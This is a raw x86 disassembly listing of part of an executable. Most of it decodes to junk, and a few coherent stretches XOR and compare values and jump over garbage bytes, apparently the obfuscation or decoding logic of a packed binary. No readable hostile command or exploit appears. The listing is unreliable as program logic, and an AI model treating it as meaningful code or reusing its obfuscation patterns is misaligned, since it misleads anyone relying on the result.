  40851e:	jb     0x4084a4
  408520:	out    dx,eax
  408521:	popf   
  408522:	and    ecx,ebx
  408524:	sub    al,0xd4
  408526:	loop   0x4084c5
  408528:	xor    al,cl
  40852a:	push   0xffffffec
  40852c:	mov    dh,0xd6
  40852e:	js     0x408557
  408530:	inc    eax
  408531:	ret    0x583a
  408534:	mov    dl,0x82
  408536:	popa   
  408537:	push   edi
  408538:	lahf   
  408539:	iret   
  40853a:	mov    edx,0x386aa337
  40853f:	aam    0xc0
  408541:	in     al,0x28
  408543:	in     eax,0x24
  408545:	loop   0x40854c
  408547:	dec    ebx
  408548:	aaa    
  408549:	xchg   ebp,eax
  40854a:	test   DWORD PTR [ecx-0x5c55593d],ebx
  408550:	leave  
  408551:	nop
  408552:	and    DWORD PTR [eax],edi
  408554:	sbb    al,BYTE PTR [eax-0x78]
  408557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408558:	xchg   ecx,eax
  408559:	dec    ebx
  40855a:	inc    DWORD PTR ds:0xe7b908e5
  408560:	sti    
  408561:	(bad)  
  408562:	inc    ebx
  408563:	xor    eax,0xcd8d0fa1
  408568:	or     DWORD PTR ds:0x509e66c8,0x16
  40856f:	mov    edx,0xad2ed533
  408574:	pop    eax
  408575:	sub    ebx,0xffffffa2
  408578:	fidivr DWORD PTR [ebx+0x7e1f8d29]
  40857e:	outs   dx,BYTE PTR ds:[esi]
  40857f:	inc    edx
  408580:	xchg   DWORD PTR [ecx+0x716933ea],ecx
  408586:	pop    ecx
  408587:	dec    BYTE PTR [esi]
  408589:	xrelease xchg DWORD PTR fs:[eax-0x53],edi
  40858e:	push   ss
  40858f:	push   eax
  408590:	xlat   BYTE PTR ds:[ebx]
  408591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408592:	add    BYTE PTR [ecx-0x62e45961],cl
  408598:	mov    cl,BYTE PTR [ebp-0x58ead3e7]
  40859e:	fistp  WORD PTR [edi-0x55101e12]
  4085a4:	inc    esi
  4085a5:	cmp    BYTE PTR [esp+edi*8+0x72],dh
  4085a9:	mov    ds:0xad3d4b7a,eax
  4085ae:	jmp    0x408588
  4085b0:	mov    ch,0xc3
  4085b2:	mov    bh,0x91
  4085b4:	mov    ?,WORD PTR [ebx+0x6]
  4085b7:	out    dx,eax
  4085b8:	xchg   ebp,eax
  4085b9:	cld    
  4085ba:	not    BYTE PTR [ebp+0xfa26f89]
  4085c0:	std    
  4085c1:	push   esi
  4085c2:	pop    ebx
  4085c3:	add    eax,0x67fb8e2c
  4085c8:	loop   0x40860a
  4085ca:	ficomp WORD PTR [esi+0x41]
  4085cd:	sti    
  4085ce:	popa   
  4085cf:	pop    eax
  4085d0:	inc    ecx
  4085d1:	sub    eax,DWORD PTR [edi]
  4085d3:	enter  0x9401,0xc0
  4085d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085d8:	in     eax,dx
  4085d9:	jbe    0x4085b0
  4085db:	xchg   ecx,eax
  4085dc:	(bad)  
  4085dd:	xchg   ebx,eax
  4085de:	fidiv  DWORD PTR ds:0xed185747
  4085e4:	js     0x4085e9
  4085e6:	popf   
  4085e7:	pop    esi
  4085e8:	rcl    BYTE PTR [edx+0x14],1
  4085eb:	mov    edx,0xa137b8a7
  4085f0:	xchg   ebp,eax
  4085f1:	jb     0x4085d9
  4085f3:	mov    ecx,0x62495bbd
  4085f8:	push   edi
  4085f9:	ja     0x408677
  4085fb:	pop    cx
  4085fd:	add    BYTE PTR [ecx],ch
  4085ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408600:	jg     0x4085a8
  408602:	jl     0x4085bd
  408604:	sbb    esi,DWORD PTR [ebp+0x71cb38d2]
  40860a:	jge    0x408626
  40860c:	dec    ebx
  40860d:	adc    eax,0x18883a70
  408612:	clc    
  408613:	dec    ebx
  408614:	pop    edi
  408615:	hlt    
  408616:	loope  0x408623
  408618:	push   ebp
  408619:	test   BYTE PTR [ebx+0x6a],dh
  40861c:	and    BYTE PTR [eax],dl
  40861e:	xor    BYTE PTR [edx+eax*1+0x6d1a523d],ah
  408625:	sub    eax,DWORD PTR [eax+0x39]
  408628:	pusha  
  408629:	mov    ecx,0x3393a855
  40862e:	std    
  40862f:	outs   dx,BYTE PTR ds:[esi]
  408630:	icebp  
  408631:	xlat   BYTE PTR ds:[ebx]
  408632:	(bad)  
  408633:	jmp    0x5bbc:0xdb53bb4e
  40863a:	test   eax,0xb2857194
  40863f:	nop
  408640:	push   ebp
  408641:	stos   BYTE PTR es:[edi],al
  408642:	out    0xbc,al
  408644:	mov    ecx,DWORD PTR [ebx+0x61cc6b8a]
  40864a:	test   DWORD PTR [eax],ebx
  40864c:	iret   
  40864d:	sar    edi,0x57
  408650:	sbb    eax,edx
  408652:	jp     0x40867c
  408654:	xchg   BYTE PTR [edx],cl
  408656:	(bad)  
  408657:	(bad)  
  408658:	(bad)  
  408659:	test   al,0xfa
  40865b:	cli    
  40865c:	jb     0x4086d7
  40865e:	mov    ah,BYTE PTR [edx+0x4b]
  408661:	std    
  408662:	cs push es
  408664:	sbb    edx,DWORD PTR [ebx+ebp*2]
  408667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408668:	out    dx,eax
  408669:	jmp    0x4844aa4e
  40866e:	ds popf 
  408670:	push   ds
  408671:	dec    edx
  408672:	sub    edx,DWORD PTR [edi+0x3a]
  408675:	je     0x4086ac
  408677:	sar    bh,cl
  408679:	sbb    eax,0xde38d1f4
  40867e:	xor    BYTE PTR [ebx],ch
  408680:	mov    WORD PTR [edx+0x6],cs
  408683:	mov    ah,0xe9
  408685:	mov    esi,0xa6093543
  40868a:	enter  0x4c5b,0xc7
  40868e:	fadd   QWORD PTR ds:0xf22634b7
  408694:	mov    ds,WORD PTR [ebx]
  408696:	(bad)  
  408697:	fadd   st(1),st
  408699:	dec    ecx
  40869a:	mov    ebx,0x8e12feb8
  40869f:	adc    DWORD PTR ds:0x433663,0x4335fb
  4086a9:	mov    DWORD PTR [ebp-0xc],ebx
  4086ac:	sbb    DWORD PTR ds:0x4336ef,0x433727
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx+0x3395704a],ecx
  4086ca:	xor    DWORD PTR [edx+0x247e7ed6],ecx
  4086d0:	jl     0x408750
  4086d2:	jle    0x408667
  4086d4:	fdivr  QWORD PTR [ecx-0x6f9f7b3b]
  4086da:	xor    DWORD PTR [edx+edi*4],ebp
  4086dd:	xchg   esi,eax
  4086de:	cmp    al,0xfb
  4086e0:	jae    0x4086b3
  4086e2:	(bad)  
  4086e3:	push   esi
  4086e4:	in     al,0xe2
  4086e6:	ret    0x2ca4
  4086e9:	cli    
  4086ea:	mov    esp,0x6c8ce638
  4086ef:	out    dx,eax
  4086f0:	iret   
  4086f1:	sub    esi,esi
  4086f3:	test   BYTE PTR [edi+0x65c3c353],bh
  4086f9:	cmp    DWORD PTR [edi],esi
  4086fb:	jge    0x4086a6
  4086fd:	mov    DWORD PTR [eax-0x272a86a2],ecx
  408703:	dec    edi
  408704:	mov    bl,BYTE PTR [edx-0x2855b30f]
  40870a:	icebp  
  40870b:	adc    al,0xf0
  40870d:	xor    DWORD PTR [edx],eax
  40870f:	xchg   esi,eax
  408710:	imul   edx,DWORD PTR [eax],0x1704981c
  408716:	cmp    DWORD PTR [edi-0x6855e401],eax
  40871c:	xor    eax,0x96c775eb
  408721:	repnz cmc 
  408723:	push   0xffffffe9
  408725:	ret    
  408726:	push   esi
  408727:	imul   esi,edi,0x3b17a9ae
  40872d:	loopne 0x4086e1
  40872f:	clc    
  408730:	adc    BYTE PTR [edx+esi*2+0x23],0x6f
  408735:	cmp    eax,0xf0e7b2d
  40873a:	ret    
  40873b:	std    
  40873c:	int3   
  40873d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40873e:	sti    
  40873f:	lods   al,BYTE PTR ds:[esi]
  408740:	loop   0x40877c
  408742:	mov    ds:0xb484860b,eax
  408747:	mov    DWORD PTR [edx-0x2c],ebp
  40874a:	pop    esp
  40874b:	xchg   edx,eax
  40874c:	jge    0x40878f
  40874e:	sbb    al,0x3e
  408750:	mov    ecx,0x922c6dd2
  408755:	in     eax,dx
  408756:	ss xor ch,ch
  408759:	or     ebp,edx
  40875b:	dec    esi
  40875c:	nop
  40875d:	(bad)  
  40875e:	mov    ecx,DWORD PTR [ebp-0x63e303ac]
  408764:	popf   
  408765:	ds out 0xc1,eax
  408768:	pop    ss
  408769:	sub    BYTE PTR [edi-0x11],ah
  40876c:	xchg   edi,eax
  40876d:	test   BYTE PTR [ecx],0x20
  408770:	mov    cl,al
  408772:	loopne 0x40876d
  408774:	jmp    0xffa3:0x63279510
  40877b:	sub    eax,0x78486f3c
  408780:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408781:	add    DWORD PTR [esi+edi*2+0x52],0x9eb969de
  408789:	aam    0x9
  40878b:	popa   
  40878c:	adc    eax,0xaf635de6
  408791:	and    al,0xd
  408793:	lock xchg edi,eax
  408795:	xor    al,0xc3
  408797:	xor    DWORD PTR [edi+0x3503a4ef],edx
  40879d:	call   0x6a088991
  4087a2:	dec    esp
  4087a3:	mov    edx,0xc6e7fe0
  4087a8:	mov    edx,0xd48c35aa
  4087ad:	cmp    bl,dh
  4087af:	stos   DWORD PTR es:[edi],eax
  4087b0:	push   ds
  4087b1:	lds    ebx,FWORD PTR [eax+0x42]
  4087b4:	and    al,0xa8
  4087b6:	lds    eax,FWORD PTR ds:0x45810adf
  4087bc:	nop
  4087bd:	sbb    al,0xcb
  4087bf:	imul   eax,edi,0x99eb6138
  4087c5:	mul    DWORD PTR [ecx]
  4087c7:	mov    bh,0x1c
  4087c9:	cmp    BYTE PTR [edx+0x6a],0x9a
  4087cd:	mov    edi,0x52bd14c2
  4087d2:	inc    edx
  4087d3:	mov    ?,esp
  4087d5:	cld    
  4087d6:	pop    edi
  4087d7:	push   ecx
  4087d8:	inc    esp
  4087d9:	mov    bh,0x93
  4087db:	or     ch,dh
  4087dd:	aam    0xe9
  4087df:	sbb    al,0x3
  4087e1:	jmp    0x42f9:0xc704314c
  4087e8:	inc    ecx
  4087e9:	sub    DWORD PTR [ebp-0x69e30df4],ecx
  4087ef:	aam    0x31
  4087f1:	mov    edi,0x16649a11
  4087f6:	rcr    BYTE PTR [ebx],0x94
  4087f9:	or     esi,DWORD PTR [edi-0x27]
  4087fc:	cmp    ecx,edi
  4087fe:	mov    fs,WORD PTR [ebx+0x2]
  408801:	push   es
  408802:	aas    
  408803:	arpl   bx,dx
  408805:	or     bh,BYTE PTR [edx]
  408807:	aaa    
  408808:	or     DWORD PTR [esi],0x7d71e557
  40880e:	add    BYTE PTR [esi],0x18
  408811:	xor    DWORD PTR [ecx+eax*1+0x627b76c],eax
  408818:	cli    
  408819:	je     0x4087dd
  40881b:	mov    eax,0x355b0724
  408820:	inc    esp
  408821:	xchg   DWORD PTR [eax-0x39aa7d92],edi
  408827:	cmp    DWORD PTR [edi-0x75073daa],ecx
  40882d:	sti    
  40882e:	sub    eax,0x245c1fa
  408833:	lahf   
  408834:	or     eax,0x8b6ea522
  408839:	iret   
  40883a:	hlt    
  40883b:	pop    esp
  40883c:	sbb    al,0xed
  40883e:	iret   
  40883f:	div    BYTE PTR [esp+ebx*8+0x4bdb461c]
  408846:	test   dh,0x25
  408849:	jno    0x4087cd
  40884b:	inc    ebx
  40884c:	std    
  40884d:	or     dh,BYTE PTR [esi+0x528dc3fc]
  408853:	ins    DWORD PTR es:[edi],dx
  408854:	mov    ebx,DWORD PTR [eax]
  408856:	cmp    eax,0x64708992
  40885b:	das    
  40885c:	push   ecx
  40885d:	mov    esi,0x7227cd7c
  408862:	pop    edx
  408863:	cmp    al,0xa6
  408865:	or     esp,ecx
  408867:	lea    edx,[ebx]
  408869:	stos   BYTE PTR es:[edi],al
  40886a:	add    eax,eax
  40886c:	data16 xchg ah,dh
  40886f:	mov    bh,BYTE PTR [esi+0x6c]
  408872:	inc    ebx
  408873:	sub    dh,BYTE PTR [edx-0x25]
  408876:	mov    esp,0x6c92711f
  40887b:	pop    edi
  40887c:	seta   bh
  40887f:	mov    ecx,DWORD PTR [edi*4+0x6566e4c]
  408886:	test   ecx,ebx
  408888:	jmp    0x40889b
  40888a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40888b:	rcl    DWORD PTR [edx-0x2e942adc],1
  408891:	loope  0x40889b
  408893:	mov    ah,0x6b
  408895:	push   ss
  408896:	loopne 0x4088dc
  408898:	icebp  
  408899:	adc    eax,0x1962e9db
  40889e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40889f:	fcom   QWORD PTR [esi-0x3bb47f87]
  4088a5:	test   BYTE PTR [ebx+0xb],bl
  4088a8:	cmp    bl,al
  4088aa:	pushf  
  4088ab:	int3   
  4088ac:	fcom   DWORD PTR [edx-0x67be2350]
  4088b2:	or     DWORD PTR [ecx-0x143027ad],edi
  4088b8:	mov    al,0xf
  4088ba:	idiv   DWORD PTR [ebx+ebx*8+0x4cf86f68]
  4088c1:	in     al,0xea
  4088c3:	stc    
  4088c4:	fldcw  WORD PTR ds:0x74c19352
  4088ca:	xor    ebp,DWORD PTR [ecx]
  4088cc:	push   ds
  4088cd:	and    eax,0x57ce27e0
  4088d2:	xchg   DWORD PTR [ecx+0x5d],esi
  4088d5:	push   edi
  4088d6:	out    dx,al
  4088d7:	mov    WORD PTR [eax+0x7e],ds
  4088da:	jge    0x4088a0
  4088dc:	clc    
  4088dd:	adc    bh,ch
  4088df:	mov    dh,0x56
  4088e1:	push   cs
  4088e2:	stos   BYTE PTR es:[edi],al
  4088e3:	loop   0x408909
  4088e5:	jl     0x4088ce
  4088e7:	mov    dl,al
  4088e9:	mov    edx,?
  4088eb:	jno    0x4088cb
  4088ed:	dec    esi
  4088ee:	sbb    BYTE PTR [esi+ebx*1+0x28ba71e8],0xcc
  4088f6:	cmp    al,0x73
  4088f8:	jmp    0x40890d
  4088fa:	(bad)  
  4088fb:	sbb    dl,dh
  4088fd:	mov    eax,DWORD PTR [eax]
  4088ff:	xor    DWORD PTR ds:0x433663,0x7c2a
  408909:	mov    cx,WORD PTR [ebp-0x4]
  40890d:	adc    DWORD PTR ds:0x4336db,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x433653,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43361f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x433727,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0xb0fe52c
  408968:	stc    
  408969:	mov    al,0xd4
  40896b:	jle    0x4089eb
  40896d:	and    al,0x7c
  40896f:	jle    0x4089ef
  408971:	jl     0x408958
  408973:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408974:	bound  eax,QWORD PTR ss:0x662a658e
  40897b:	retf   
  40897c:	pushf  
  40897d:	jg     0x4089e6
  40897f:	or     ebp,DWORD PTR [ecx]
  408981:	bound  edi,QWORD PTR ds:0x42fc027b
  408987:	ret    
  408988:	push   edx
  408989:	aaa    
  40898a:	bound  ebx,QWORD PTR [esi]
  40898c:	imul   ebx,DWORD PTR [ecx],0xffffff87
  40898f:	sbb    dh,ch
  408991:	gs into 
  408993:	xchg   BYTE PTR [edx+0x3b3466a3],ch
  408999:	cdq    
  40899a:	mov    al,ds:0x4cabd7ab
  40899f:	mov    dl,0xc6
  4089a1:	pop    eax
  4089a2:	and    eax,0x3586d7b0
  4089a7:	cmp    eax,0xb2e5adae
  4089ac:	push   ebp
  4089ad:	cmp    edi,DWORD PTR [ecx+0x61]
  4089b0:	call   0x84ae:0xfefb2385
  4089b7:	retf   
  4089b8:	push   0x10
  4089ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089bb:	jle    0x4089fb
  4089bd:	in     al,dx
  4089be:	jge    0x408a13
  4089c0:	fidiv  DWORD PTR ds:0x99192619
  4089c6:	fst    QWORD PTR [eax-0x3bf235fd]
  4089cc:	add    DWORD PTR [ebx],ebx
  4089ce:	sbb    al,0xdc
  4089d0:	jmp    0x697a:0x4e3c2eee
  4089d7:	fld    st(3)
  4089d9:	cmp    eax,0x1eb76875
  4089de:	sbb    eax,0xd5cfccd2
  4089e3:	pop    eax
  4089e4:	out    0x9f,eax
  4089e6:	repz fs (bad) 
  4089ea:	stc    
  4089eb:	mov    cl,cl
  4089ed:	adc    eax,0xdd68848f
  4089f2:	add    bl,bl
  4089f4:	dec    esi
  4089f5:	or     edi,DWORD PTR [esi]
  4089f7:	mov    eax,ds:0x550a0fd3
  4089fc:	stos   BYTE PTR es:[edi],al
  4089fd:	jnp    0x408a2e
  4089ff:	mov    dl,0x24
  408a01:	xor    al,0xcb
  408a03:	aaa    
  408a04:	imul   ecx,DWORD PTR [ecx],0x63
  408a07:	dec    eax
  408a08:	(bad)  
  408a09:	shl    al,cl
  408a0b:	xchg   esi,eax
  408a0d:	in     al,dx
  408a0e:	xchg   edi,eax
  408a0f:	lea    eax,[edx+ecx*8-0x7403cf7f]
  408a16:	inc    esp
  408a17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a18:	aad    0x90
  408a1a:	inc    edx
  408a1b:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  408a1d:	clc    
  408a1e:	inc    esp
  408a1f:	mov    cl,0x85
  408a21:	hlt    
  408a22:	sbb    eax,0x1b30b204
  408a27:	ret    0x4f5a
  408a2a:	adc    al,0xbc
  408a2c:	pop    ss
  408a2d:	sbb    BYTE PTR [ebx],dh
  408a2f:	adc    DWORD PTR [ecx-0x59],edi
  408a32:	pop    ecx
  408a33:	push   es
  408a34:	pop    ecx
  408a35:	(bad)  
  408a36:	sti    
  408a37:	mov    al,ds:0x81fac889
  408a3c:	lea    ebp,[eax]
  408a3e:	pop    ebp
  408a3f:	stc    
  408a40:	fsub   st,st(3)
  408a42:	sbb    al,0x77
  408a44:	push   ds
  408a45:	pop    es
  408a46:	sti    
  408a47:	sbb    eax,0x3dc22caf
  408a4c:	aas    
  408a4d:	inc    ebp
  408a4e:	and    al,BYTE PTR [ecx+ebp*2-0x62]
  408a52:	sub    BYTE PTR [edi+0x76],cl
  408a55:	push   edi
  408a56:	sub    edx,DWORD PTR [edi-0x22bc0848]
  408a5c:	xor    DWORD PTR [eax+0x6f],edi
  408a5f:	sbb    ah,bl
  408a61:	inc    ebp
  408a62:	mov    esi,0xfe8cb88
  408a67:	int    0x17
  408a69:	push   es
  408a6a:	stc    
  408a6b:	mov    edi,0xe86c1306
  408a70:	repz mov esi,0x4a71c84c
  408a76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a77:	add    BYTE PTR [ebx-0x384903e3],0xa
  408a7e:	test   eax,0x8b27a3b
  408a83:	push   ecx
  408a84:	inc    ebx
  408a85:	add    ecx,edi
  408a87:	mov    bh,0x90
  408a89:	cmp    al,BYTE PTR [ebp+0x78]
  408a8c:	repnz push ebx
  408a8e:	mov    esp,eax
  408a90:	jb     0x408a93
  408a92:	push   ecx
  408a93:	rcl    DWORD PTR [ebx-0x35],1
  408a96:	out    0x41,al
  408a98:	sub    eax,0xc4d61ad5
  408a9d:	cmp    DWORD PTR [ebx-0x7a7dbc84],ebx
  408aa3:	adc    cl,al
  408aa5:	inc    esi
  408aa6:	add    esp,DWORD PTR [ebx]
  408aa8:	or     BYTE PTR [edi],ch
  408aaa:	lds    edx,FWORD PTR [esi-0x5a]
  408aad:	ret    
  408aae:	pop    ebp
  408aaf:	int    0xb3
  408ab1:	cmp    dh,ch
  408ab3:	rcl    BYTE PTR [ebx+0x1ce0bd9c],1
  408ab9:	add    al,0x82
  408abb:	jbe    0x408aa6
  408abd:	sbb    eax,0x5821ede5
  408ac2:	sbb    eax,0x2985cf1a
  408ac7:	neg    BYTE PTR [ecx-0x6883eb89]
  408acd:	adc    DWORD PTR [esi+0x5f],ebx
  408ad0:	inc    ebp
  408ad1:	fidivr WORD PTR [edi]
  408ad3:	add    BYTE PTR [ebx+0x14c7d64e],ch
  408ad9:	mov    edx,fs
  408adb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408adc:	push   esi
  408add:	shl    BYTE PTR fs:[edi+0x6f],1
  408ae1:	dec    esi
  408ae2:	xor    BYTE PTR [ecx+0x3f4414e5],0x45
  408ae9:	jnp    0x408b5e
  408aeb:	retf   0x750
  408aee:	sar    edi,0x70
  408af1:	ret    
  408af2:	std    
  408af3:	int    0xf2
  408af5:	es pop ds
  408af7:	push   es
  408af8:	in     al,0x62
  408afa:	xor    esp,DWORD PTR [ecx]
  408afc:	mov    WORD PTR [eax-0x7a],?
  408aff:	and    al,0xba
  408b01:	xor    bh,BYTE PTR [edx+esi*1]
  408b04:	nop
  408b05:	fisttp WORD PTR [ebx-0x34733197]
  408b0b:	into   
  408b0c:	test   dh,0x6e
  408b0f:	into   
  408b10:	add    bh,bh
  408b12:	(bad)  [eax+0x3b13a724]
  408b18:	cli    
  408b19:	and    DWORD PTR [edx+edx*4+0x34406a63],edx
  408b20:	test   eax,0x5c8a7374
  408b25:	enter  0x7c8a,0x75
  408b29:	(bad)  [esi-0x21190964]
  408b2f:	ds aam 0x40
  408b32:	adc    DWORD PTR [eax+edx*1],esp
  408b35:	add    BYTE PTR [esp+edi*2+0x1a],0x90
  408b3a:	pop    ds
  408b3b:	inc    ebx
  408b3c:	pushf  
  408b3d:	or     eax,0x9b4e02e5
  408b42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b43:	iret   
  408b44:	mov    ?,ebp
  408b46:	or     BYTE PTR [esi+0x60],0xd9
  408b4a:	nop
  408b4b:	xlat   BYTE PTR ds:[ebx]
  408b4c:	aaa    
  408b4d:	gs jmp 0x408b9f
  408b50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b51:	ja     0x408ad6
  408b53:	ins    BYTE PTR es:[edi],dx
  408b54:	in     al,0xf4
  408b56:	fs jno 0x408ae7
  408b59:	inc    ecx
  408b5a:	push   edx
  408b5b:	arpl   WORD PTR [esi],bx
  408b5d:	mov    bh,BYTE PTR [ecx]
  408b5f:	dec    ebx
  408b60:	xor    ch,BYTE PTR [eax+0xbfb5af9]
  408b66:	fcomp  DWORD PTR [esi+ebx*4+0x3c]
  408b6a:	push   esi
  408b6b:	popa   
  408b6c:	(bad)  [ecx]
  408b6e:	pop    edi
  408b6f:	ror    DWORD PTR [ebx],cl
  408b71:	stos   DWORD PTR es:[edi],eax
  408b72:	xor    al,0x97
  408b74:	xlat   BYTE PTR ds:[ebx]
  408b75:	adc    eax,0x115a200f
  408b7a:	jmp    0x408bcc
  408b7c:	repnz cwde 
  408b7e:	daa    
  408b7f:	inc    eax
  408b80:	mov    edx,edx
  408b82:	and    DWORD PTR [ebp-0x66e832eb],edi
  408b88:	(bad)  
  408b89:	(bad)  
  408b8a:	(bad)  
  408b8b:	and    dh,al
  408b8d:	or     BYTE PTR [edi-0x42],0x24
  408b91:	inc    esp
  408b92:	cmp    al,0xaf
  408b94:	(bad)  
  408b95:	hlt    
  408b96:	mov    al,ds:0x62ab9c06
  408b9b:	jne    0x408bbe
  408ba1:	mov    eax,DWORD PTR [ebp+0x8]
  408ba4:	mov    ecx,DWORD PTR [ebp-0x10]
  408ba7:	xor    eax,esi
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	dec    ecx
  408bf1:	jl     0x408bb0
  408bf3:	xor    al,0x66
  408bf5:	sar    BYTE PTR [esi+0x7e],cl
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	pop    esp
  408bfd:	cmc    
  408bfe:	lods   al,BYTE PTR ds:[esi]
  408bff:	in     eax,0x15
  408c01:	(bad)  
  408c02:	or     al,0x8
  408c04:	adc    al,0x21
  408c06:	add    eax,0x446ffda9
  408c0b:	xchg   esp,eax
  408c0c:	arpl   WORD PTR [edi],cx
  408c0e:	dec    ebx
  408c0f:	mov    ds,ebx
  408c11:	retf   
  408c12:	aaa    
  408c13:	or     BYTE PTR [ebx-0x2d1d5b74],cl
  408c19:	into   
  408c1a:	lods   al,BYTE PTR ds:[esi]
  408c1b:	loope  0x408be9
  408c1d:	and    ebp,DWORD PTR [esi-0x53]
  408c20:	xchg   edx,eax
  408c21:	inc    esi
  408c22:	dec    edi
  408c23:	(bad)  
  408c24:	mov    edx,0xaa458767
  408c29:	mov    DWORD PTR [edi],0x1aa4fee5
  408c2f:	xchg   BYTE PTR [eax],dl
  408c31:	push   esp
  408c32:	fwait
  408c33:	imul   bl
  408c35:	mov    eax,DWORD PTR [esi-0x6e9a5147]
  408c3b:	ds sbb al,0x67
  408c3e:	das    
  408c3f:	xchg   BYTE PTR [eax],bh
  408c41:	sbb    al,0xc3
  408c43:	mov    eax,cs
  408c45:	std    
  408c46:	add    ebx,DWORD PTR [ebx-0x1e]
  408c49:	ficom  DWORD PTR [edi-0x1edd4808]
  408c4f:	or     bl,BYTE PTR [esi]
  408c51:	fs mov ah,0x4a
  408c54:	dec    esp
  408c55:	jbe    0x408c86
  408c57:	xchg   ebx,eax
  408c58:	fdivp  st(6),st
  408c5a:	jmp    0x408c11
  408c5c:	fidivr DWORD PTR [esi+0x311de85b]
  408c62:	sbb    ebp,esi
  408c64:	scas   al,BYTE PTR es:[edi]
  408c65:	mov    WORD PTR [esp+ebx*1+0x587f11e4],fs
  408c6c:	aad    0xd
  408c6e:	xor    DWORD PTR [eax],edx
  408c70:	aaa    
  408c71:	pop    esp
  408c72:	cmp    BYTE PTR [eax+esi*4+0x79],dl
  408c76:	(bad)  
  408c77:	cmp    eax,eax
  408c79:	jle    0x408c0c
  408c7b:	data16 fisttp DWORD PTR [edx]
  408c7e:	xlat   BYTE PTR ds:[ebx]
  408c7f:	xor    al,0xe6
  408c81:	mov    ds:0xc758e45b,eax
  408c86:	sbb    cl,bl
  408c88:	mov    cs,WORD PTR [esi]
  408c8a:	enter  0xeedc,0xa
  408c8e:	pop    ebp
  408c8f:	mov    edx,0xe811b0aa
  408c94:	jne    0x408c35
  408c96:	fwait
  408c97:	dec    edx
  408c98:	sbb    cl,BYTE PTR [esi]
  408c9a:	dec    edx
  408c9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c9c:	and    dl,cl
  408c9e:	push   ecx
  408c9f:	fld    TBYTE PTR [ebp+0x7f329674]
  408ca5:	mov    al,ds:0x504b4102
  408caa:	jecxz  0x408cb4
  408cac:	jg     0x408cea
  408cae:	pushf  
  408caf:	adc    eax,0x925c1c9c
  408cb4:	jge    0x408cb3
  408cb6:	std    
  408cb7:	fst    DWORD PTR [eax+eiz*8-0x19]
  408cbb:	pushf  
  408cbc:	xor    DWORD PTR [edx-0x6d],0xffffffdd
  408cc0:	pop    eax
  408cc1:	sub    DWORD PTR [esi-0x36c66eb],edx
  408cc7:	(bad)  
  408cc8:	mov    ah,0xc2
  408cca:	inc    ecx
  408ccb:	sub    DWORD PTR [esp+edx*4+0x19],ecx
  408ccf:	aaa    
  408cd0:	push   esp
  408cd1:	mov    esi,0xac8a4610
  408cd6:	out    0x25,eax
  408cd8:	mov    cl,0xaf
  408cda:	retf   0xdecf
  408cdd:	xchg   ebp,eax
  408cde:	es push esi
  408ce0:	loop   0x408cb1
  408ce2:	sub    al,0xef
  408ce4:	aaa    
  408ce5:	pop    edi
  408ce6:	jne    0x408d38
  408ce8:	ins    DWORD PTR es:[edi],dx
  408ce9:	mov    ecx,0x844b4076
  408cee:	in     eax,0xb5
  408cf0:	test   cl,al
  408cf2:	popa   
  408cf3:	cmp    esp,DWORD PTR [ebp+ebp*2+0x59dc73f5]
  408cfa:	outs   dx,BYTE PTR ds:[esi]
  408cfb:	cmp    al,0x9d
